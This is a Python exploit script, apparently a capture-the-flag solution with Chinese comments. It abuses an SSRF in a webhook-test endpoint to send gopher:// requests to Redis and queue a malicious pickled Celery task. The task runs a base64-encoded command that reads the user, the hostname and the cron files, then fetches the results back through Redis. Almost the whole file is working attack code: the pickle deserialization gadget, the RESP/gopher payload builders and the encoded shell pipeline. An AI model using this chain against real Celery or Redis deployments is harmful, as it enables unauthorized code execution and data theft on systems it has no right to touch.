#!/usr/bin/env python3

import ast
import base64
import json
import os
import pickle
import time
import urllib.parse

import requests


WEBHOOK_URL = "http://localhost:8080/api/admin/webhook-test"

JWT = os.environ["SESSION_TOKEN"]

RESULT_KEY = "ctf:rce_result"


# ------------------------------------------------------------
# RCE 後執行的 Python 程式
#
# 不直接把結果回傳給 attacker，
# 而是寫入 Redis，之後再透過 SSRF + Redis GET 回來。
# ------------------------------------------------------------

RESULT_SCRIPT = f"""
import os
import socket
import redis

r = redis.Redis(
    host="redis",
    port=6379,
    decode_responses=True,
)

result = {{
    "status": "RCE_SUCCESS",
    "user": os.popen("id -un").read().strip(),
    "hostname": socket.gethostname(),
    "crontab": os.popen("cat /etc/cron.d/* 2>&1").read().strip()
}}

r.set(
    "{RESULT_KEY}",
    str(result),
    ex=60,
)
"""


# Base64 是為了避免 shell quoting / 換行問題
RESULT_SCRIPT_B64 = base64.b64encode(
    RESULT_SCRIPT.encode()
).decode()

COMMAND = (
    f"echo {RESULT_SCRIPT_B64} "
    f"| base64 -d "
    f"| python3"
)


# ------------------------------------------------------------
# Pickle RCE
# ------------------------------------------------------------

class RCE:
    def __reduce__(self):
        return (
            __import__("os").system,
            (COMMAND,),
        )


# ------------------------------------------------------------
# Celery message envelope
# ------------------------------------------------------------

TASK = {
    "content-type": "application/x-python-serialize",
    "properties": {
        "delivery_tag": "16f3f59d-003c-4ef4-b1ea-6fa92dee529a",
        "reply_to": "9edb8565-0b59-3389-944e-a0139180a048",
        "delivery_mode": 2,
        "body_encoding": "base64",
        "delivery_info": {
            "routing_key": "celery",
            "priority": 0,
            "exchange": "celery",
        },
        "correlation_id": "6e046b48-bca4-49a0-bfa7-a92847216999",
    },
    "headers": {},
    "content-encoding": "binary",
}


def make_pickle_body():
    payload = pickle.dumps(
        RCE(),
        protocol=2,
    )

    print("[+] Pickle payload:")
    print(f"    {len(payload)} bytes")

    return base64.b64encode(payload).decode()


def make_redis_lpush(task_json):
    """
    Redis RESP:

        LPUSH celery <task_json>
    """

    data = task_json.encode()

    command = (
        b"*3\r\n"
        b"$5\r\nLPUSH\r\n"
        b"$6\r\ncelery\r\n"
        + f"${len(data)}\r\n".encode()
        + data
        + b"\r\n"
    )

    return command


def make_redis_get(key):
    """
    Redis RESP:

        GET <key>
    """

    key_bytes = key.encode()

    return (
        b"*2\r\n"
        b"$3\r\nGET\r\n"
        + f"${len(key_bytes)}\r\n".encode()
        + key_bytes
        + b"\r\n"
    )


def make_gopher_url(resp):
    encoded = urllib.parse.quote_from_bytes(
        resp,
        safe="",
    )

    return "gopher://redis:6379/_" + encoded


def ssrf_redis(resp):
    """
    經由：

        Player
          ↓
        webhook-test
          ↓
        SSRF
          ↓
        Redis
    """

    gopher_url = make_gopher_url(resp)

    headers = {
        "Content-Type": "application/json",
        "Cookie": f"session_token={JWT}",
    }

    response = requests.post(
        WEBHOOK_URL,
        headers=headers,
        json={
            "url": gopher_url,
        },
        timeout=10,
    )

    return response


# ------------------------------------------------------------
# Decode Redis / webhook response
# ------------------------------------------------------------

def decode_redis_response(response_text):
    """
    將 webhook 回傳的內容解析成 Python dict。

    實際資料結構：

        HTTP JSON
        └── body
            └── Redis RESP bulk string
                └── Python dict string

    例如：

        {
            "body": "$90\\r\\n{'status': 'RCE_SUCCESS', ...}\\r\\n",
            "status": "partial_response_on_timeout"
        }
    """

    try:
        # ----------------------------------------------------
        # 1. Decode HTTP JSON
        # ----------------------------------------------------

        outer = json.loads(response_text)

        body = outer.get("body", "")

        if not isinstance(body, str):
            print("[-] Unexpected Redis response body type")
            return None

        # ----------------------------------------------------
        # 2. Decode Redis RESP bulk string
        #
        # 格式：
        #
        # $90\r\n
        # <90 bytes of data>
        # \r\n
        # ----------------------------------------------------

        if body.startswith("$"):
            header, payload = body.split("\r\n", 1)

            length = int(header[1:])

            if length < 0:
                # Redis NIL:
                #
                # $-1
                #
                return None

            # 只取 RESP 宣告的長度
            payload = payload[:length]

        else:
            payload = body

        # ----------------------------------------------------
        # 3. Redis GET 回傳的是 Python dict 的 str()
        #
        # 例如：
        #
        # {'status': 'RCE_SUCCESS',
        #  'user': 'celeryuser'}
        #
        # 使用 literal_eval，而不是 eval，
        # 避免把回傳內容當成 Python code 執行。
        # ----------------------------------------------------

        result = ast.literal_eval(payload)

        if not isinstance(result, dict):
            print("[-] Decoded result is not a dictionary")
            return None

        return result

    except (json.JSONDecodeError, ValueError, SyntaxError) as exc:
        print(f"[-] Failed to decode Redis response: {exc}")
        return None

    except Exception as exc:
        print(f"[-] Unexpected decode error: {exc}")
        return None


def print_result(result):
    """
    以漂亮的 JSON 格式輸出結果。
    """

    print("\n[+] RCE result received:")
    print("----------------------------------------")

    print(
        json.dumps(
            result,
            indent=2,
            ensure_ascii=False,
        )
    )

    print("----------------------------------------")


# ------------------------------------------------------------
# Main
# ------------------------------------------------------------

def main():
    print("[+] Target:")
    print(f"    {WEBHOOK_URL}")

    print("[+] Result key:")
    print(f"    {RESULT_KEY}")

    print("[+] RCE command:")
    print(f"    {COMMAND}")

    # --------------------------------------------------------
    # 1. 建立 malicious pickle
    # --------------------------------------------------------

    TASK["body"] = make_pickle_body()

    # --------------------------------------------------------
    # 2. JSON serialize Celery envelope
    # --------------------------------------------------------

    task_json = json.dumps(
        TASK,
        separators=(",", ":"),
    )

    print("[+] Celery message:")
    print(f"    {len(task_json)} bytes")

    # --------------------------------------------------------
    # 3. Redis LPUSH
    # --------------------------------------------------------

    resp = make_redis_lpush(task_json)

    print("[+] Redis LPUSH:")
    print(f"    {len(resp)} bytes")

    # --------------------------------------------------------
    # 4. Gopher → Redis → LPUSH
    # --------------------------------------------------------

    print("\n[+] Sending RCE payload...")

    response = ssrf_redis(resp)

    print(f"[+] HTTP status: {response.status_code}")
    print("[+] Response:")
    print(response.text)

    # --------------------------------------------------------
    # 5. 等待 Celery worker 執行
    # --------------------------------------------------------

    print("\n[+] Waiting for Celery worker...")

    for attempt in range(10):
        time.sleep(0.5)

        # ----------------------------------------------------
        # 6. Gopher → Redis → GET ctf:rce_result
        # ----------------------------------------------------

        get_resp = make_redis_get(RESULT_KEY)

        result_response = ssrf_redis(get_resp)

        print(
            f"[+] Attempt {attempt + 1}/10: "
            f"HTTP {result_response.status_code}"
        )

        # ----------------------------------------------------
        # 7. Decode
        # ----------------------------------------------------

        result = decode_redis_response(
            result_response.text
        )

        if result is not None:
            print_result(result)
            return

    # --------------------------------------------------------
    # Timeout
    # --------------------------------------------------------

    print("\n[-] No RCE result received.")
    print("[-] Possible causes:")
    print("    - Celery worker did not consume the task")
    print("    - pickle deserialization failed")
    print("    - redis Python module is missing")
    print("    - webhook did not return the Redis response")
    print("    - Celery worker has not finished yet")


if __name__ == "__main__":
    main()